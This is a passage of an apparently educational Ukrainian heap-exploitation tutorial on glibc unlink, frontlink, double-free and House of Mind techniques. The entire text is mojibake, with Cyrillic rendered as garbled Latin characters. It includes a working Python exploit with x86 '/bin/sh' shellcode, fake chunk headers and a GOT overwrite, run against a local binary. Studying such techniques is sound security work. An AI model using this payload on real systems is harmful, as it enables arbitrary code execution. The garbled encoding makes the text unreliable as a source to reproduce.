–£ ‚Äúsize‚Äù —î –±—ñ—Ç–∏ –¥–ª—è –≤–∫–∞–∑—ñ–≤–∫–∏: —á–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —à–º–∞—Ç–æ–∫, —á–∏ –±—É–≤ —à–º–∞—Ç–æ–∫ –≤–∏–¥—ñ–ª–µ–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é mmap() —ñ —á–∏ –Ω–∞–ª–µ–∂–∏—Ç—å —à–º–∞—Ç–æ–∫ –¥–æ –ø–µ—Ä–≤–∏–Ω–Ω–æ—ó –∞—Ä–µ–Ω–∏.

–Ø–∫—â–æ –ø—Ä–∏ –∑–≤—ñ–ª—å–Ω–µ–Ω–Ω—ñ —à–º–∞—Ç–∫–∞ –æ–¥–∏–Ω –∑ —Å—É—Å—ñ–¥–Ω—ñ—Ö –≤–∏—è–≤–ª—è—î—Ç—å—Å—è –≤—ñ–ª—å–Ω–∏–º, –≤–æ–Ω–∏ –æ–±'—î–¥–Ω—É—é—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–∞–∫—Ä–æ—Å—É unlink() —ñ –Ω–æ–≤–∏–π –±—ñ–ª—å—à–∏–π —à–º–∞—Ç–æ–∫ –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è frontlink() –¥–ª—è –≤—Å—Ç–∞–≤–∫–∏ –≤ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π bin.

unlink(){\
BK = P->bk; ‚Äî> BK –Ω–æ–≤–æ–≥–æ —à–º–∞—Ç–∫–∞ —î —Ç–∏–º, —â–æ –º–∞–≤ –≤—ñ–ª—å–Ω–∏–π —à–º–∞—Ç–æ–∫ —Ä–∞–Ω—ñ—à–µ\
FD = P->fd; ‚Äî> FD –Ω–æ–≤–æ–≥–æ —à–º–∞—Ç–∫–∞ —î —Ç–∏–º, —â–æ –º–∞–≤ –≤—ñ–ª—å–Ω–∏–π —à–º–∞—Ç–æ–∫ —Ä–∞–Ω—ñ—à–µ\
FD->bk = BK; ‚Äî> BK –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞ –≤–∫–∞–∑—É—î –Ω–∞ –Ω–æ–≤–∏–π —à–º–∞—Ç–æ–∫\
BK->fd = FD; ‚Äî> FD –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ —à–º–∞—Ç–∫–∞ –≤–∫–∞–∑—É—î –Ω–∞ –Ω–æ–≤–∏–π —à–º–∞—Ç–æ–∫\
}

–û—Ç–∂–µ, —è–∫—â–æ –Ω–∞–º –≤–¥–∞—Å—Ç—å—Å—è –∑–º—ñ–Ω–∏—Ç–∏ P->bk –Ω–∞ –∞–¥—Ä–µ—Å—É shellcode —ñ P->fd –Ω–∞ –∞–¥—Ä–µ—Å—É –≤—Ö–æ–¥—É –≤ GOT –∞–±–æ DTORS –º—ñ–Ω—É—Å 12, –º–∏ –¥–æ—Å—è–≥–Ω–µ–º–æ:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

–Ü —Ç–∞–∫ shellcode –≤–∏–∫–æ–Ω–∞—î—Ç—å—Å—è –ø—Ä–∏ –≤–∏—Ö–æ–¥—ñ –∑ –ø—Ä–æ–≥—Ä–∞–º–∏.

–ö—Ä—ñ–º —Ç–æ–≥–æ, 4-—Ç–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è unlink() –∑–∞–ø–∏—Å—É—î —â–æ—Å—å, —ñ shellcode –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ –≤—ñ–¥—Ä–µ–º–æ–Ω—Ç–æ–≤–∞–Ω–∞ –¥–ª—è —Ü—å–æ–≥–æ:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> –¶–µ –≤–∏–∫–ª–∏–∫–∞—î –∑–∞–ø–∏—Å 4 –±–∞–π—Ç—ñ–≤, –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ 8-–≥–æ –±–∞–π—Ç–∞ shellcode, —Ç–æ–º—É –ø–µ—Ä—à–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è shellcode –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ jmp, —â–æ–± –ø—Ä–æ–ø—É—Å—Ç–∏—Ç–∏ —Ü–µ —ñ –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤ nops, —è–∫—ñ –≤–µ–¥—É—Ç—å –¥–æ —Ä–µ—à—Ç–∏ shellcode.

–û—Ç–∂–µ, –µ–∫—Å–ø–ª–æ–π—Ç —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è:

–£ buffer1 –º–∏ –ø–æ–º—ñ—â–∞—î–º–æ shellcode, –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ jmp, —â–æ–± –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤ nops –∞–±–æ –≤ —Ä–µ—à—Ç—É shellcode.

–ü—ñ—Å–ª—è shellcode –º–∏ –≤—Å—Ç–∞–≤–ª—è—î–º–æ –∑–∞–ø–æ–≤–Ω—é–≤–∞—á –¥–æ –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è –ø–æ–ª—è prev\_size —ñ size –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞. –£ —Ü–∏—Ö –º—ñ—Å—Ü—è—Ö –º–∏ –≤—Å—Ç–∞–≤–ª—è—î–º–æ 0xfffffff0 (—Ç–∞–∫, —â–æ–± –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ prev\_size, —â–æ–± –≤—ñ–Ω –º–∞–≤ –±—ñ—Ç, —â–æ –≤–∫–∞–∑—É—î, —â–æ –≤—ñ–Ω –≤—ñ–ª—å–Ω–∏–π) —ñ ‚Äú-4‚Äú(0xfffffffc) –≤ size (—â–æ–±, –∫–æ–ª–∏ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –≤ 3-–º—É —à–º–∞—Ç–∫—É, —è–∫—â–æ 2-–π –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –≤—ñ–ª—å–Ω–∏–π, –≤—ñ–Ω –ø–µ—Ä–µ–π–¥–µ –¥–æ –∑–º—ñ–Ω–µ–Ω–æ–≥–æ prev\_size, —è–∫–µ —Å–∫–∞–∂–µ, —â–æ –≤—ñ–Ω –≤—ñ–ª—å–Ω–∏–π) -> –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∫–æ–ª–∏ free() –ø–µ—Ä–µ–≤—ñ—Ä—è—î, –≤—ñ–Ω –ø–µ—Ä–µ–π–¥–µ –¥–æ size 3-–≥–æ, –∞–ª–µ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –ø–µ—Ä–µ–π–¥–µ –¥–æ 2-–≥–æ - 4 —ñ –ø–æ–¥—É–º–∞—î, —â–æ 2-–π —à–º–∞—Ç–æ–∫ –≤—ñ–ª—å–Ω–∏–π. –Ü —Ç–æ–¥—ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏–º–µ **unlink()**.

–ü—Ä–∏ –≤–∏–∫–ª–∏–∫—É unlink() –≤—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ —è–∫ P->fd –ø–µ—Ä—à—ñ –¥–∞–Ω—ñ –∑ 2-–≥–æ —à–º–∞—Ç–∫–∞, —Ç–æ–º—É —Ç—É–¥–∏ –±—É–¥–µ –≤—Å—Ç–∞–≤–ª–µ–Ω–∞ –∞–¥—Ä–µ—Å–∞, —è–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ - 12 (–æ—Å–∫—ñ–ª—å–∫–∏ –≤ FD->bk –≤—ñ–Ω –¥–æ–¥–∞—Å—Ç—å 12 –¥–æ –∑–±–µ—Ä–µ–∂–µ–Ω–æ—ó –∞–¥—Ä–µ—Å–∏ –≤ FD). –Ü –≤ —Ü—é –∞–¥—Ä–µ—Å—É –±—É–¥–µ –≤—Å—Ç–∞–≤–ª–µ–Ω–∞ –¥—Ä—É–≥–∞ –∞–¥—Ä–µ—Å–∞, —è–∫—É –≤—ñ–Ω –∑–Ω–∞–π–¥–µ –≤ 2-–º—É —à–º–∞—Ç–∫—É, —è–∫–∞ –Ω–∞—Å —Ü—ñ–∫–∞–≤–∏—Ç–∏–º–µ, —â–æ–± –±—É—Ç–∏ –∞–¥—Ä–µ—Å–æ—é –¥–æ shellcode (–ø–æ–º–∏–ª–∫–æ–≤–∏–π P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 –±–∞–π—Ç—ñ–≤ –∑–∞–ø–æ–≤–Ω—é–≤–∞—á–∞**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #–¶—ñ–∫–∞–≤–æ, —â–æ–± –±—ñ—Ç, —â–æ –≤–∫–∞–∑—É—î, —â–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —à–º–∞—Ç–æ–∫ –≤—ñ–ª—å–Ω–∏–π, –±—É–≤ 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, —â–æ–± –≤—ñ–Ω –¥—É–º–∞–≤, —â–æ ‚Äúsize‚Äù 3-–≥–æ —à–º–∞—Ç–∫–∞ –Ω–∞ 4 –±–∞–π—Ç–∏ –ø–æ–∑–∞–¥—É (–≤–∫–∞–∑—É—î –Ω–∞ prev\_size), –æ—Å–∫—ñ–ª—å–∫–∏ —Å–∞–º–µ —Ç–∞–º –≤—ñ–Ω –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –≤—ñ–ª—å–Ω–∏–π 2-–π —à–º–∞—Ç–æ–∫**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #–ù–∞ –ø–æ—á–∞—Ç–∫—É –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–∏ –≤—Å—Ç–∞–≤–∏–º–æ 8 –±–∞–π—Ç—ñ–≤ –∑–∞–ø–æ–≤–Ω—é–≤–∞—á–∞**

**got\_free = pack("\<I", 0x08048300 - 12) #–ê–¥—Ä–µ—Å–∞ free() –≤ plt-12 (—Ü–µ –±—É–¥–µ –∞–¥—Ä–µ—Å–∞, —è–∫—É –ø–µ—Ä–µ–∑–∞–ø–∏—à—É—Ç—å, —â–æ–± –∑–∞–ø—É—Å—Ç–∏—Ç–∏ shellcode –ø—ñ–¥ —á–∞—Å –¥—Ä—É–≥–æ–≥–æ –≤–∏–∫–ª–∏–∫—É free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # –Ø–∫ –≤–∂–µ –±—É–ª–æ —Å–∫–∞–∑–∞–Ω–æ, –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ 8 –±–∞–π—Ç—ñ–≤ –∑–∞–ø–æ–≤–Ω—é–≤–∞—á–∞, –ø—Ä–æ—Å—Ç–æ —Ç–∞–∫**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #–ú–æ–¥–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è 2-–π —à–º–∞—Ç–æ–∫, got\_free –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, –∫—É–¥–∏ –º–∏ –±—É–¥–µ–º–æ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –∞–¥—Ä–µ—Å—É addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() –∑–≤—ñ–ª—å–Ω—è—é—á–∏ –≤ –∑–≤–æ—Ä–æ—Ç–Ω–æ–º—É –ø–æ—Ä—è–¥–∫—É (wargame)**

–ú–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é—î–º–æ 3 –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ —à–º–∞—Ç–∫–∏, —ñ –≤–æ–Ω–∏ –∑–≤—ñ–ª—å–Ω—è—é—Ç—å—Å—è –≤ –∑–≤–æ—Ä–æ—Ç–Ω–æ–º—É –ø–æ—Ä—è–¥–∫—É –¥–æ –≤–∏–¥—ñ–ª–µ–Ω–æ–≥–æ.

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É:

–£ —à–º–∞—Ç–∫—É c –ø–æ–º—ñ—â–∞—î—Ç—å—Å—è shellcode

–®–º–∞—Ç–æ–∫ a –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É b —Ç–∞–∫, —â–æ–± size –º–∞–≤ –±—ñ—Ç PREV\_INUSE, –¥–µ–∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∏–π, —â–æ–± –≤—ñ–Ω –¥—É–º–∞–≤, —â–æ —à–º–∞—Ç–æ–∫ a –≤—ñ–ª—å–Ω–∏–π.

–ö—Ä—ñ–º —Ç–æ–≥–æ, –≤ –∑–∞–≥–æ–ª–æ–≤–∫—É b –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î—Ç—å—Å—è size, —â–æ–± –≤—ñ–Ω –¥–æ—Ä—ñ–≤–Ω—é–≤–∞–≤ -4.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –ø—Ä–æ–≥—Ä–∞–º–∞ –ø–æ–¥—É–º–∞—î, —â–æ ‚Äúa‚Äù –≤—ñ–ª—å–Ω–∏–π —ñ –≤ bin, —Ç–æ–º—É –≤–∏–∫–ª–∏–∫–∞—Ç–∏–º–µ unlink() –¥–ª—è –π–æ–≥–æ —Ä–æ–∑–≤'—è–∑–∞–Ω–Ω—è. –û–¥–Ω–∞–∫, –æ—Å–∫—ñ–ª—å–∫–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ PREV\_SIZE –¥–æ—Ä—ñ–≤–Ω—é—î -4, –≤–æ–Ω–∞ –ø–æ–¥—É–º–∞—î, —â–æ —à–º–∞—Ç–æ–∫ ‚Äúa‚Äù –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –≤ b+4. –¢–æ–±—Ç–æ, –≤–æ–Ω–∞ –≤–∏–∫–æ–Ω–∞—î unlink() –¥–ª—è —à–º–∞—Ç–∫–∞, —è–∫–∏–π –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –≤ b+4, —Ç–æ–º—É –≤ b+12 –±—É–¥–µ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ ‚Äúfd‚Äù, –∞ –≤ b+16 –±—É–¥–µ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ ‚Äúbk‚Äù.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ –≤ bk –º–∏ –ø–æ–º—ñ—Å—Ç–∏–º–æ –∞–¥—Ä–µ—Å—É –¥–æ shellcode, –∞ –≤ fd –∞–¥—Ä–µ—Å—É –¥–æ —Ñ—É–Ω–∫—Ü—ñ—ó ‚Äúputs()‚Äù-12, –º–∏ –æ—Ç—Ä–∏–º–∞—î–º–æ –Ω–∞—à–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.

**–¢–µ—Ö–Ω—ñ–∫–∞ Frontlink**

Frontlink –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –∫–æ–ª–∏ –∑–≤—ñ–ª—å–Ω—è—î—Ç—å—Å—è —â–æ—Å—å, —ñ –∂–æ–¥–µ–Ω –∑ –π–æ–≥–æ —Å—É—Å—ñ–¥–Ω—ñ—Ö —à–º–∞—Ç–∫—ñ–≤ –Ω–µ —î –≤—ñ–ª—å–Ω–∏–º, unlink() –Ω–µ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –∞ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è frontlink().

–ö–æ—Ä–∏—Å–Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –∫–æ–ª–∏ malloc, —è–∫–∏–π –∞—Ç–∞–∫—É—é—Ç—å, –Ω—ñ–∫–æ–ª–∏ –Ω–µ –∑–≤—ñ–ª—å–Ω—è—î—Ç—å—Å—è (free()).

–ü–æ—Ç—Ä—ñ–±–Ω–æ:

–ë—É—Ñ–µ—Ä, —è–∫–∏–π –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–ø–æ–≤–Ω–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó –≤–≤–µ–¥–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö

–ë—É—Ñ–µ—Ä, —Å—É—Å—ñ–¥–Ω—ñ–π –∑ —Ü–∏–º, —è–∫–∏–π –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –∑–≤—ñ–ª—å–Ω–µ–Ω–∏–π, —ñ –≤ —è–∫–æ–º—É –±—É–¥–µ –∑–º—ñ–Ω–µ–Ω–æ –ø–æ–ª–µ fd –π–æ–≥–æ –∑–∞–≥–æ–ª–æ–≤–∫–∞ –∑–∞–≤–¥—è–∫–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—é –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –±—É—Ñ–µ—Ä–∞

–ë—É—Ñ–µ—Ä –¥–ª—è –∑–≤—ñ–ª—å–Ω–µ–Ω–Ω—è –∑ —Ä–æ–∑–º—ñ—Ä–æ–º –±—ñ–ª—å—à–∏–º –∑–∞ 512, –∞–ª–µ –º–µ–Ω—à–∏–º –∑–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –±—É—Ñ–µ—Ä

–ë—É—Ñ–µ—Ä, –æ–≥–æ–ª–æ—à–µ–Ω–∏–π –ø–µ—Ä–µ–¥ –∫—Ä–æ–∫–æ–º 3, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ prev\_size —Ü—å–æ–≥–æ

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –¥–æ—Å—è–≥–Ω—É–≤—à–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –≤ –¥–≤–æ—Ö mallocs –Ω–µ–∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ —ñ –≤ –æ–¥–Ω–æ–º—É –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ, –∞–ª–µ –∑–≤—ñ–ª—å–Ω—è—é—á–∏ –ª–∏—à–µ —Ü–µ–π –æ–¥–∏–Ω, –º–∏ –º–æ–∂–µ–º–æ –∑—Ä–æ–±–∏—Ç–∏ –µ–∫—Å–ø–ª–æ–π—Ç.

**–í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å double free()**

–Ø–∫—â–æ –¥–≤—ñ—á—ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ free() –∑ –æ–¥–Ω–∏–º —ñ —Ç–∏–º –∂–µ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–æ–º, –∑–∞–ª–∏—à–∞—Ç—å—Å—è –¥–≤–∞ bins, —â–æ –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ –æ–¥–Ω—É –π —Ç—É –∂ –∞–¥—Ä–µ—Å—É.

–£ —Ä–∞–∑—ñ –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –æ–¥–Ω–æ–≥–æ –∑ –Ω–∏—Ö, –≤—ñ–Ω –±—É–¥–µ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –±–µ–∑ –ø—Ä–æ–±–ª–µ–º. –£ —Ä–∞–∑—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —ñ–Ω—à–æ–≥–æ, –π–æ–º—É –±—É–¥–µ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ —Ç–æ–π –∂–µ –ø—Ä–æ—Å—Ç—ñ—Ä, —Ç–æ–º—É –º–∏ –æ—Ç—Ä–∏–º–∞—î–º–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∏ ‚Äúfd‚Äù —ñ ‚Äúbk‚Äù, —è–∫—ñ –±—É–¥—É—Ç—å —Ñ–∞–ª—å—à–∏–≤–∏–º–∏ –∑ –¥–∞–Ω–∏–º–∏, —è–∫—ñ –∑–∞–ø–∏—à–µ –ø–æ–ø–µ—Ä–µ–¥–Ω—î —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è.

**–ü—ñ—Å–ª—è free()**

–ü–æ–ø–µ—Ä–µ–¥–Ω—å–æ –∑–≤—ñ–ª—å–Ω–µ–Ω–∏–π –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∑–Ω–æ–≤—É –±–µ–∑ –∫–æ–Ω—Ç—Ä–æ–ª—é.

## **8 –ü–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –∫—É–ø–∏: –ø—Ä–æ—Å—É–Ω—É—Ç—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏**

–¢–µ—Ö–Ω—ñ–∫–∏ Unlink() —Ç–∞ FrontLink() –±—É–ª–∏ —É—Å—É–Ω–µ–Ω—ñ —à–ª—è—Ö–æ–º –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ñ—É–Ω–∫—Ü—ñ—ó unlink().

**–ë—É–¥–∏–Ω–æ–∫ —Ä–æ–∑—É–º—É**

–î–ª—è –≤–∏–∫–ª–∏–∫—É –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É –ø–æ—Ç—Ä—ñ–±–µ–Ω –ª–∏—à–µ –æ–¥–∏–Ω –≤–∏–∫–ª–∏–∫ free(). –í–∞–∂–ª–∏–≤–æ –∑–Ω–∞–π—Ç–∏ –¥—Ä—É–≥–∏–π —à–º–∞—Ç–æ–∫, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–∏–π –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º —ñ –∑–≤—ñ–ª—å–Ω–µ–Ω–∏–º.

–í–∏–∫–ª–∏–∫ free() –≤–∏–∫–ª–∏–∫–∞—î public\_fREe(mem), —Ü–µ–π –≤–∏–∫–æ–Ω—É—î:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mem); ‚Äî> –ü–æ–≤–µ—Ä—Ç–∞—î –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ –∞–¥—Ä–µ—Å—É, –¥–µ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è —à–º–∞—Ç–æ–∫ (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

–£ \[1] –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –ø–æ–ª–µ size –±—ñ—Ç NON\_MAIN\_ARENA, —è–∫–µ –º–æ–∂–Ω–∞ –∑–º—ñ–Ω–∏—Ç–∏, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø–æ–≤–µ—Ä–Ω—É–ª–∞ true —ñ –≤–∏–∫–æ–Ω–∞–ª–∞ heap\_for\_ptr(), —â–æ —Ä–æ–±–∏—Ç—å and –¥–æ ‚Äúmem‚Äù, –∑–∞–ª–∏—à–∞—é—á–∏ 0 –Ω–∞ 2.5 –Ω–∞–π–º–µ–Ω—à –∑–Ω–∞—á—É—â–∏—Ö –±–∞–π—Ç–∞—Ö (—É –Ω–∞—à–æ–º—É –≤–∏–ø–∞–¥–∫—É –∑ 0x0804a000 –∑–∞–ª–∏—à–∞—î 0x08000000) —ñ –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ 0x08000000->ar\_ptr (—è–∫ –¥–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ heap\_info)

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ –º–∏ –º–æ–∂–µ–º–æ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —à–º–∞—Ç–æ–∫, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≤ 0x0804a000, —ñ –±—É–¥–µ –∑–≤—ñ–ª—å–Ω–µ–Ω–æ —à–º–∞—Ç–æ–∫ –≤ **0x081002a0**, –º–∏ –º–æ–∂–µ–º–æ –¥—ñ—Å—Ç–∞—Ç–∏—Å—è –¥–æ –∞–¥—Ä–µ—Å–∏ 0x08100000 —ñ –∑–∞–ø–∏—Å–∞—Ç–∏ —â–æ –∑–∞–≤–≥–æ–¥–Ω–æ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, **0x0804a000**. –ö–æ–ª–∏ —Ü–µ–π –¥—Ä—É–≥–∏–π —à–º–∞—Ç–æ–∫ –±—É–¥–µ –∑–≤—ñ–ª—å–Ω–µ–Ω–æ, –≤–∏—è–≤–∏—Ç—å—Å—è, —â–æ heap\_for\_ptr(ptr)->ar\_ptr –ø–æ–≤–µ—Ä—Ç–∞—î —Ç–µ, —â–æ –º–∏ –∑–∞–ø–∏—Å–∞–ª–∏ –≤ 0x08100000 (–æ—Å–∫—ñ–ª—å–∫–∏ –¥–æ 0x081002a0 –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è and, —è–∫–∏–π –º–∏ –±–∞—á–∏–ª–∏ —Ä–∞–Ω—ñ—à–µ, —ñ –∑–≤—ñ–¥—Ç–∏ –±–µ—Ä–µ—Ç—å—Å—è –∑–Ω–∞—á–µ–Ω–Ω—è –ø–µ—Ä—à–∏—Ö 4 –±–∞–π—Ç—ñ–≤, ar\_ptr)

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è \_int\_free(ar\_ptr, mem), —Ç–æ–±—Ç–æ **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

–Ø–∫ –º–∏ –±–∞—á–∏–ª–∏ —Ä–∞–Ω—ñ—à–µ, –º–∏ –º–æ–∂–µ–º–æ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è av, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ —Ç–µ, —â–æ –º–∏ –∑–∞–ø–∏—Å–∞–ª–∏ –≤ —à–º–∞—Ç–æ–∫, —è–∫–∏–π –±—É–¥–µ –∑–≤—ñ–ª—å–Ω–µ–Ω–æ.

–¢–∞–∫, —è–∫ –≤–∏–∑–Ω–∞—á–µ–Ω–æ unsorted\_chunks, –º–∏ –∑–Ω–∞—î–º–æ, —â–æ:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

–û—Ç–∂–µ, —è–∫—â–æ –≤ av->bins\[2] –º–∏ –∑–∞–ø–∏—à–µ–º–æ –∑–Ω–∞—á–µ–Ω–Ω—è \_\_DTOR\_END\_\_-12, –≤ –æ—Å—Ç–∞–Ω–Ω—ñ–π —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó –±—É–¥–µ –∑–∞–ø–∏—Å–∞–Ω–æ –≤ \_\_DTOR\_END\_\_ –∞–¥—Ä–µ—Å—É –¥—Ä—É–≥–æ–≥–æ —à–º–∞—Ç–∫–∞.

–¢–æ–±—Ç–æ, –≤ –ø–µ—Ä—à–æ–º—É —à–º–∞—Ç–∫—É –º–∏ –ø–æ–≤–∏–Ω–Ω—ñ –±–∞–≥–∞—Ç–æ —Ä–∞–∑—ñ–≤ –≤—Å—Ç–∞–≤–∏—Ç–∏ –∞–¥—Ä–µ—Å—É \_\_DTOR\_END\_\_-12, –æ—Å–∫—ñ–ª—å–∫–∏ –∑–≤—ñ–¥—Ç–∏ av->bins\[2] —ó—ó –≤—ñ–∑—å–º–µ.

